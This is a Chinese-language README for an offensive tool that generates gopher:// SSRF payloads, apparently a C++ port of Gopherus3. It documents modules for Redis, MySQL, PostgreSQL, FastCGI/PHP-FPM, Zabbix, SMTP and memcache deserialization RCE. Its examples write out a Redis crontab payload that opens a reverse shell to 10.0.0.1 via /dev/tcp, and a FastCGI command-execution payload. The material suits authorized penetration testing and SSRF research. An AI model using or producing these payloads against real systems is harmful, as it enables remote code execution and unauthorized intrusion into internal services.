# zemu-gopher

Gopherus3（SSRF gopher:// payload 生成器）的 C++26 重写版。单文件、零依赖。

## 构建

需要支持 C++26 的编译器（开发环境为 MSYS2 UCRT64 GCC 16.1）：

```bash
g++ -std=c++2c -O2 -o bin/zemu-gopher.exe src/main.cpp
```

或 CMake（3.28+）：

```bash
cmake -B build -G "MinGW Makefiles" && cmake --build build
```

> Windows 下直接双击运行需要 `C:\msys64\ucrt64\bin` 在 PATH 中（libstdc++ 等 DLL）。

## 用法

```
zemu-gopher --exploit <类型> [参数...] [--host H] [--port P] [--post 模式] [--silent]
```

通用选项：

| 选项 | 说明 |
|---|---|
| `--host` / `--port` | 目标 host/port，默认 127.0.0.1 + 各服务默认端口 |
| `--post` | 后处理器：`default` / `line-n`（\r\n→\n）/ `line-rn`（\n→\r\n）/ `end-with-00` |
| `--silent` | 只输出 gopher URL，方便脚本使用 |

各 exploit 参数：

| exploit | 默认端口 | 参数 |
|---|---|---|
| `redis` | 6379 | `--content` / `--content-file`、`--dir`、`--filename` |
| `mysql` | 3306 | `--user`、`--query`（需 MySQL 用户无密码） |
| `postgresql` | 5432 | `--user`、`--db`、`--query` |
| `fastcgi` | 9000 | `--targetfile`、`--command` |
| `smtp` | 25 | `--mailfrom`、`--mailto`、`--subject`、`--msg` |
| `zabbix` | 10050 | `--command` |
| `dmpmemcache` | 11211 | `--code` |
| `phpmemcache` | 11211 | `--code`（PHP 序列化 payload） |
| `pymemcache` | 11211 | `--command`（pickle 反序列化 RCE） |
| `rbmemcache` | 11211 | `--command`（Ruby marshal RCE） |
| `plaintext` | 25 | `--file`（`-` 表示 stdin）、`--mode`（NONE/QUOTE_PLUS/QUOTE/QUOTE_SAFE/HEX/HEX_UPCASE） |

## 示例

```bash
# Redis 写 crontab 反弹 shell
zemu-gopher --exploit redis --dir /var/spool/cron/ --filename root \
  --content '*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/1234 0>&1' --silent

# FastCGI 打 PHP-FPM
zemu-gopher --exploit fastcgi --targetfile /var/www/html/index.php --command id

# 自定义报文（从文件/stdin 读原始内容编码成 gopher URL）
echo -e 'GET /admin HTTP/1.1\r\nHost: x\r\n' | zemu-gopher --exploit plaintext --file - --port 8000
```

## 与 Python 版的兼容性

已对 redis / mysql / zabbix / smtp / postgresql / dmpmemcache / phpmemcache /
fastcgi / rbmemcache / plaintext 做逐字节差分测试，输出与 Gopherus3 完全一致。

差异说明：

- `pymemcache`：Python 3 下原版 pickle 局部类会直接报错，本版生成等价的
  pickle protocol 0 字节流（`posix.system(cmd)` → REDUCE）。
- 全部为命令行参数驱动，无交互式向导。
